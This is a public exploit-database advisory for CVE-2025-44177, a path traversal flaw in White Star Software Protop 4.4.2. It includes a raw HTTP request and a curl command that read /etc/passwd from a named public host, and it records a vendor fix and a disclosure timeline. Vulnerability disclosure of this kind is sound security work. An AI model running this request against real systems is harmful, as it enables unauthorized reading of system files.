---
title: White Star Software Protop 4.4.2-2024-11-27 Local File Inclusion
url: https://cxsecurity.com/issue/WLB-2025070039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-01
fetch_date: 2025-10-07T00:14:48.552523
---

# White Star Software Protop 4.4.2-2024-11-27 Local File Inclusion

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **White Star Software Protop 4.4.2-2024-11-27 Local File Inclusion** **2025.07.31**  Credit:  **[Imraan Khan](https://cxsecurity.com/author/Imraan%2BKhan/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-44177](https://cxsecurity.com/cveshow/CVE-2025-44177/ "Click to see CVE-2025-44177")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")  [CWE-98](https://cxsecurity.com/cwe/CWE-98 "Click to see CWE-98")** | |

# Exploit Title: White Star Software Protop 4.4.2-2024-11-27 - Local File Inclusion (LFI)
# Date: 2025-07-09
# Exploit Author: Imraan Khan (Lich-Sec)
# Vendor Homepage: https://wss.com/
# Software Link: https://client.protop.co.za/
# Version: v4.4.2-2024-11-27
# Tested on: Ubuntu 22.04 / Linux
# CVE: CVE-2025-44177
# CWE: CWE-22 - Path Traversal
# Description:
# A Local File Inclusion vulnerability exists in White Star Software Protop v4.4.2.
# An unauthenticated remote attacker can retrieve arbitrary files via
# URL-encoded traversal sequences in the `/pt3upd/` endpoint.
# Vulnerable Endpoint:
GET /pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: client.protop.co.za
User-Agent: curl/8.0
Accept: \*/\*
# Example curl command:
curl -i 'https://client.protop.co.za/pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd'
# Notes:
# - Vulnerability confirmed on public instance at time of testing.
# - CVSS v3.1 Base Score: 8.2 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N)
# - The vendor was notified and a fix was issued.
# Disclosure Timeline:
# - Discovered: 2025-03-13
# - Disclosed to vendor: 2025-03-20
# - CVE Assigned: 2025-07-01
# - Public Disclosure: 2025-07-09

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070039)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top